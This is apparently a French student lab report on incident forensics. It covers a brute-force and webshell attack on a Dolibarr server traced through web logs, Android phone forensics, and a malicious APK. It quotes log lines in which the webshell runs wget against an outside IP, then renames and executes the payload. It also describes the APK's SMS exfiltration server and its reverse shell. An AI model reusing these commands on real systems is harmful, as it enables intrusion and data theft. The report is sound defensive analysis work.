# Securite - TP4

## Exercice 1

## Exercice 2 

### 1.

L'attaque brute-force dans les logs commence par une série de requêtes répétitives vers le fichier `auth.php` sur le service ERP Dolibarr. Ces requêtes semblent provenir de l'adresse IP `192.168.1.10` et utilisent l'outil `Wget`, ce qui est suspect, il peut être utilisé pour automatiser des requêtes.

Les premières lignes pertinentes des logs qui montrent cette séquence de requêtes répétées :

```txt
192.168.1.10 - - [23/May/2023:09:36:21 +0100] "POST /dolibarr/htdocs/modules/auth.php HTTP/1.1" 200 7535 "-" "Wget/1.21"
192.168.1.10 - - [23/May/2023:09:36:23 +0100] "POST /dolibarr/htdocs/modules/auth.php HTTP/1.1" 200 7535 "-" "Wget/1.21"
192.168.1.10 - - [23/May/2023:09:36:25 +0100] "POST /dolibarr/htdocs/modules/auth.php HTTP/1.1" 200 7535 "-" "Wget/1.21"
```

Cela montre que l'attaque commence le **23 mai 2023 à 09:36:21**. L'attaque bruteforce se manifeste par des requêtes POST successives au même fichier `auth.php`, ce qui suggère des tentatives répétées de connexion ou d'authentification.

### 2.

L'attaquant a tenté plusieurs extensions de fichiers PHP afin de trouver une vulnérabilité. Voici les extensions testées dans les logs, basées sur les requêtes faites par l'attaquant après la série brute-force réussie :

```txt
192.168.1.10 - - [23/May/2023:09:54:17 +0100] "POST /dolibarr/htdocs/user/64nxlskk.php?id=2 HTTP/1.1" 200 7439 "http://www.pms.com/dolibarr/htdocs/" "python-requests/2.25.1"
192.168.1.10 - - [23/May/2023:09:54:17 +0100] "GET /dolibarr/documents/users/2/64nxlskk.php?cmd=id HTTP/1.1" 404 490 "-" "python-requests/2.25.1"
192.168.1.10 - - [23/May/2023:09:54:18 +0100] "POST /dolibarr/htdocs/user/64nxlskk.phtml?id=2 HTTP/1.1" 200 7778 "http://www.pms.com/dolibarr/htdocs/" "python-requests/2.25.1"
192.168.1.10 - - [23/May/2023:09:54:18 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phtml?cmd=id HTTP/1.1" 404 490 "-" "python-requests/2.25.1"
192.168.1.10 - - [23/May/2023:09:54:18 +0100] "POST /dolibarr/htdocs/user/64nxlskk.php3?id=2 HTTP/1.1" 200 7817 "http://www.pms.com/dolibarr/htdocs/" "python-requests/2.25.1"
192.168.1.10 - - [23/May/2023:09:54:18 +0100] "GET /dolibarr/documents/users/2/64nxlskk.php3?cmd=id HTTP/1.1" 404 490 "-" "python-requests/2.25.1"
192.168.1.10 - - [23/May/2023:09:54:18 +0100] "POST /dolibarr/htdocs/user/64nxlskk.php4?id=2 HTTP/1.1" 200 7861 "http://www.pms.com/dolibarr/htdocs/" "python-requests/2.25.1"
192.168.1.10 - - [23/May/2023:09:54:18 +0100] "GET /dolibarr/documents/users/2/64nxlskk.php4?cmd=id HTTP/1.1" 404 490 "-" "python-requests/2.25.1"
192.168.1.10 - - [23/May/2023:09:54:18 +0100] "POST /dolibarr/htdocs/user/64nxlskk.php5?id=2 HTTP/1.1" 200 7893 "http://www.pms.com/dolibarr/htdocs/" "python-requests/2.25.1"
192.168.1.10 - - [23/May/2023:09:54:18 +0100] "GET /dolibarr/documents/users/2/64nxlskk.php5?cmd=id HTTP/1.1" 404 490 "-" "python-requests/2.25.1"
192.168.1.10 - - [23/May/2023:09:54:18 +0100] "POST /dolibarr/htdocs/user/64nxlskk.php6?id=2 HTTP/1.1" 200 7936 "http://www.pms.com/dolibarr/htdocs/" "python-requests/2.25.1"
192.168.1.10 - - [23/May/2023:09:54:18 +0100] "GET /dolibarr/documents/users/2/64nxlskk.php6?cmd=id HTTP/1.1" 404 490 "-" "python-requests/2.25.1"
192.168.1.10 - - [23/May/2023:09:54:18 +0100] "POST /dolibarr/htdocs/user/64nxlskk.php7?id=2 HTTP/1.1" 200 7976 "http://www.pms.com/dolibarr/htdocs/" "python-requests/2.25.1"
192.168.1.10 - - [23/May/2023:09:54:18 +0100] "GET /dolibarr/documents/users/2/64nxlskk.php7?cmd=id HTTP/1.1" 404 490 "-" "python-requests/2.25.1"
```

Les extensions testées par l'attaquant sont :

1. `.php`
2. `.phtml`
3. `.php3`
4. `.php4`
5. `.php5`
6. `.php6`
7. `.php7`

L'attaquant essaie ces extensions pour trouver un fichier vulnérable capable d'exécuter du code via une requête POST.

### 3.

Examinons attentivement les logs après que l'attaquant ait testé plusieurs extensions :

1. **Examen des extensions utilisées** : Après avoir testé plusieurs extensions comme `.php`, `.phtml`, `.php3`, `.php4`, `.php5`, `.php6`, `.php7`, et avoir reçu principalement des erreurs `404` (fichier non trouvé), il y a une exception notable : l'extension **`.phar`**.

2. **Requête spécifique avec `.phar`** :
   - L'attaquant effectue une requête vers le fichier `64nxlskk.phar` :
     ```
     192.168.1.10 - - [23/May/2023:09:54:18 +0100] "POST /dolibarr/htdocs/user/64nxlskk.phar?id=2 HTTP/1.1" 200 7736 "http://www.pms.com/dolibarr/htdocs/" "python-requests/2.25.1"
     ```
   - Le code réponse est **200**, ce qui indique que cette requête a réussi. Cela signifie que le serveur a répondu positivement à cette requête, contrairement aux autres tentatives avec les extensions précédentes qui renvoyaient des erreurs `404`.

3. **Suivi de l'attaque** : Après l'utilisation réussie de l'extension `.phar`, on voit plusieurs requêtes GET avec le paramètre `cmd=id` :
   ```
   192.168.1.10 - - [23/May/2023:09:54:18 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=id HTTP/1.1" 200 257 "-" "python-requests/2.25.1"
   ```
   - Cette requête renvoie également un code réponse **200**, suggérant que l'attaquant a réussi à exploiter une vulnérabilité dans le fichier `.phar`.

4. **Confirmation** : L'extension `.phar` est la seule qui a fonctionné avec succès et a été utilisée par l'attaquant pour exécuter des commandes sur le serveur via le paramètre `cmd=id`.

On en déduit donc que l'extension que l'attaquant utilise finalement pour poursuivre l'attaque est **`.phar`**, après avoir testé plusieurs autres extensions sans succès.

### 4.

Voici les lignes pertinentes :

```
192.168.1.10 - - [23/May/2023:09:55:20 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=wget%20http://240.123.207.20/fiche_de_poste.odt HTTP/1.1" 200 486 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
192.168.1.10 - - [23/May/2023:09:55:38 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=mv%20fiche_de_poste.odt%20fiche_de_poste HTTP/1.1" 200 203 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
192.168.1.10 - - [23/May/2023:09:55:52 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=chmod%20755%20fiche_de_poste HTTP/1.1" 200 203 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
192.168.1.10 - - [23/May/2023:09:58:22 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=./fiche_de_poste HTTP/1.1" 200 245 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
```

### Analyse des commandes exécutées :

1. **Commande 1 (wget)** :
   ```
   192.168.1.10 - - [23/May/2023:09:55:20 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=wget%20http://240.123.207.20/fiche_de_poste.odt HTTP/1.1" 200 486
   ```
   - L'attaquant utilise la commande **`wget`** pour télécharger un fichier appelé **`fiche_de_poste.odt`** depuis l'adresse IP **240.123.207.20**.
   - Cette commande est utilisée pour récupérer un fichier à distance et l'enregistrer sur le serveur compromis.

2. **Commande 2 (mv)** :
   ```
   192.168.1.10 - - [23/May/2023:09:55:38 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=mv%20fiche_de_poste.odt%20fiche_de_poste HTTP/1.1" 200 203
   ```
   - L'attaquant renomme ensuite le fichier téléchargé avec la commande **`mv`**, en le passant de **`fiche_de_poste.odt`** à **`fiche_de_poste`**.
   - Cela peut être une étape pour préparer ce fichier à être exécuté comme un script ou un programme.

3. **Commande 3 (chmod)** :
   ```
   192.168.1.10 - - [23/May/2023:09:55:52 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=chmod%20755%20fiche_de_poste HTTP/1.1" 200 203
   ```
   - L'attaquant modifie les permissions du fichier avec la commande **`chmod 755`**. 
   - Cela donne des permissions d'exécution (lecture, écriture, et exécution pour l'utilisateur) au fichier **`fiche_de_poste`**, ce qui indique que le fichier est probablement un script ou un programme que l'attaquant veut exécuter.

4. **Commande 4 (exécution du fichier)** :
   ```
   192.168.1.10 - - [23/May/2023:09:58:22 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=./fiche_de_poste HTTP/1.1" 200 245
   ```
   - Enfin, l'attaquant exécute directement le fichier **`fiche_de_poste`** en utilisant **`./fiche_de_poste`**, ce qui indique que le fichier téléchargé est exécuté comme un script ou un binaire.
   - Cela suggère que ce fichier pourrait contenir du code malveillant ou être un outil permettant à l'attaquant de poursuivre l'exploitation du serveur.


## Exercice 3

### 1.

La base de données où sont stockés les SMS/MMS se trouve dans le chemin suivant : `./user_de/0/com.android.providers.telephony/databases/mmssms.db`. Cette base de données est une base SQLite3, et les informations concernant les SMS sont stockées dans la table `sms`. 

### 2. 

En analysant la base de données des SMS/MMS (après avoir fait un `select * from sms;), nous avons identifié un message pertinent qui mentionne un changement d’identifiants. Le message avec l’ID **151** contient une information clé concernant la distribution des nouveaux identifiants intranet à travers une image jointe. Ce message a été envoyé le **21 mai 2023** à **10h15 UTC**. Un autre message sous l’ID **148** mentionne également que les identifiants de tous les utilisateurs seront modifiés dans deux semaines, envoyé le **11 mai 2023** à **07h28 UTC**. Ces messages pourraient être liés à la fuite d’identifiants.

### 3.


Nous avons identifié un message mentionnant que les identifiants ERP avaient été changés et qu’une image contenant ces informations avait été envoyée. Nous avons alors décidé de rechercher cette image en parcourant le système de fichiers, en nous concentrant sur le répertoire utilisé par l'application de téléphonie pour stocker les pièces jointes MMS.

Nous avons commencé par naviguer dans le répertoire des données utilisateurs, puis utilisé la commande suivante pour trouver des fichiers d’images dans le répertoire spécifique de `com.android.providers.telephony` :

```bash
find ./user_de/0/com.android.providers.telephony/ -name "*.jpg" -o -name "*.png" -o -name "*.pdf"
```

Cette commande a permis de localiser une image pertinente au chemin suivant :

**Chemin du fichier** :  
`./user_de/0/com.android.providers.telephony/app_parts/PART_1684736100000_image0000001.jpg`

Nous avons ensuite extrait et ouvert cette image, qui contient la liste des identifiants des utilisateurs, y compris leur **nom**, **login**, **mot de passe** et **équipe**.

Les informations cruciales pour notre investigation concernent l'équipe **RH**, dont les identifiants sont les suivants :

- **Login** : `cvoyance` et `ydurev`
- **Mot de passe** : `!RH2023`

Cela confirme que les identifiants de l’équipe RH ont été compromis via cette image jointe à un MMS.

### 4.

Pour identifier l'application malveillante, nous avons commencé par analyser les fichiers système de l'appareil. Nous avons utilisé les fichiers `packages.list` et `packages.xml` pour comprendre quelles applications étaient installées et leurs permissions.

1. **Exploration de `packages.list`** :
   La commande suivante a permis de lister toutes les applications présentes :
   ```bash
   cat packages.list
   ```
   Dans cette liste, nous avons remarqué l'application **eu.chainfire.supersu**, connue pour donner des accès root. Cette application étant inhabituelle sur un appareil non rooté, elle est devenue notre principale suspecte.

2. **Recherche dans `packages.xml`** :
   Pour obtenir plus de détails, nous avons cherché l'application dans `packages.xml` à l'aide de la commande suivante :
   ```bash
   grep -A 40 'eu.chainfire.supersu' packages.xml
   ```
   Cette recherche a confirmé la présence de **SuperSU** et révélé qu'elle disposait de permissions sensibles :
   - **SYSTEM_ALERT_WINDOW** : permet de se superposer aux autres applications.
   - **RECEIVE_BOOT_COMPLETED** : assure le démarrage automatique avec l'appareil.
   - **GET_TASKS** : surveille les autres applications en cours d'exécution.

3. **Conversion du timestamp d'installation** :
   Nous avons identifié un attribut `it` (installation time) dans le fichier `packages.xml` avec la valeur hexadécimale **181CEFB9C48**. Nous avons utilisé un convertisseur pour transformer cette valeur en décimal :
   - Hexadécimal : **181CEFB9C48**
   - Décimal : **1657035005000** (timestamp Unix en millisecondes).

   Ensuite, nous avons converti ce timestamp en date lisible à l'aide de la commande suivante :
   ```bash
   date -d @1657035005
   ```
   Ce qui nous a donné la date d'installation : **5 juillet 2022 à 15:30:05**.

### 5.

Nous avons commencé par localiser la base de données en naviguant dans le système de fichiers de l'appareil. Après avoir trouvé le chemin de la base de données, nous avons utilisé la commande suivante pour accéder à celle-ci :

```bash
sqlite3 ./data/data/com.android.providers.calendar/databases/calendar.db
```

Ensuite, nous avons listé les tables présentes dans cette base de données avec la commande `.tables`. Cela nous a permis d'identifier la table pertinente, à savoir **Events**, qui contient les événements du calendrier.

Nous avons ensuite utilisé la commande suivante pour examiner la structure de la table **Events** :

```sql
PRAGMA table_info(Events);
```

Cela nous a permis de connaître les colonnes disponibles, y compris `dtstart` et `dtend`, qui représentent respectivement le début et la fin de chaque événement en format timestamp.

Sachant que l'application malveillante avait été installée à un timestamp spécifique (1683360000000), nous avons cherché des événements qui se produisaient dans un intervalle de 24 heures autour de cette date. Pour cela, nous avons exécuté la requête suivante :

```sql
SELECT * 
FROM Events 
WHERE dtstart <= 1683360000000 + 86400000 AND dtend >= 1683360000000 - 86400000;
```

Sachant que le nombre 86400000 représente le nombre de millisecondes dans une journée.

Cette requête a retourné plusieurs résultats, parmi lesquels un événement suspect : **"Barbecue"**. Nous avons constaté que cet événement avait un timestamp de début (dtstart) de 1683352800000 et un timestamp de fin (dtend) de 1683356400000, ce qui correspond au 5 mai 2023 à 10:00:00 UTC.

Bien que nous ayons d'abord suspecté un autre événement intitulé **"Réparation téléphone"**, il ne correspondait pas à la date d'installation de l'application malveillante. En revanche, l'événement **"Barbecue"** se déroulait juste avant l'installation, ce qui soulève des questions sur la possibilité que l'application ait été installée pendant cet événement.

## Exercice 4

### 1.

```bash
root@debian-1:~# ls 
AndroidManifest.xml  cert	  kotlin    okhttp3  resources.arsc  tp2.tar.gz
base.apk	     classes.dex  META-INF  res      testssl.sh      websec23-tp2
```

On voit dans les fichiers que le projet a été fait en kotlin.

Pour répondre aux questions 2 et 3 concernant l'analyse de l'APK, voici les démarches détaillées, les commandes utilisées, et les réflexions menées :

### 2.

Pour retrouver les permissions de l'application, nous avons utilisé l'outil `aapt`, qui permet d'extraire des informations d'un fichier APK. 

**Extraction des permissions** :

   Après avoir installé `aapt`, nous avons exécuté la commande pour obtenir les permissions de l'application :

   ```bash
   aapt dump permissions base.apk
   ```

   Cette commande nous a donné les permissions suivantes :
   - `android.permission.READ_SMS`
   - `android.permission.RECEIVE_BOOT_COMPLETED`
   - `android.permission.INTERNET`

Ces permissions indiquent que l'application a la capacité de lire les messages SMS, de s'exécuter au démarrage du téléphone et d'accéder à Internet, ce qui peut être caractéristique d'une application malveillante cherchant à surveiller ou à intercepter des informations sensibles.

### 3.

Pour retrouver le numéro de version de la librairie `androidx:core:core`, nous avons procédé comme suit :

1. **Navigation dans le répertoire META-INF** :
   
   Après avoir décompressé l'APK avec la commande :
   ```bash
   unzip base.apk
   ```
   Nous avons navigué dans le répertoire `META-INF` pour examiner les fichiers présents, qui contiennent des informations sur les dépendances de l'application.

2. **Liste des fichiers de version** :
3. 
   En utilisant la commande `ls`, nous avons trouvé plusieurs fichiers, y compris `androidx.core_core.version`, qui correspond à la librairie `androidx:core:core`.

4. **Lecture du fichier de version** :
5. 
   Nous avons ensuite affiché le contenu du fichier pour extraire la version :
   ```bash
   cat androidx.core_core.version
   ```
   Ce qui a révélé que la version de la librairie est **1.5.0**.


### 4.

Le langage du code décompilé est principalement du Java, car les applications Android sont écrites dans ce langage et compilées en bytecode. Lorsque ce bytecode est décompilé, l'outil de décompilation génère une version approximative du code source Java d'origine. 

### 5.

Dans le fichier `DumpData.java`, nous trouvons l'adresse du serveur sur lequel les SMS sont envoyés. Voici le code pertinent :

```java
private static String SERVER_IP = "sms.pms.droid.vubugzurwpehppqzwsshvypjwtmxkekg.xyz";
private static int SERVER_PORT = 8888;
```

L'adresse complète est donc : `http://sms.pms.droid.vubugzurwpehppqzwsshvypjwtmxkekg.xyz:8888/`.

### 6.

Dans le même répertoire, le fichier `ReverseShell.java` est conçu pour établir une connexion de shell inversé à un serveur. Il se connecte à l'adresse IP `240.123.207.20` sur le port `8888` et redirige les entrées et sorties du shell de l'appareil Android vers ce serveur. Ce type de fonctionnalité est souvent utilisé dans les scénarios de malware pour donner à un attaquant un accès à distance à l'appareil de la victime.

Ces informations soulignent l'objectif malveillant de l'application, qui cherche à collecter des données personnelles en envoyant des SMS et en établissant un accès non autorisé via un shell inversé.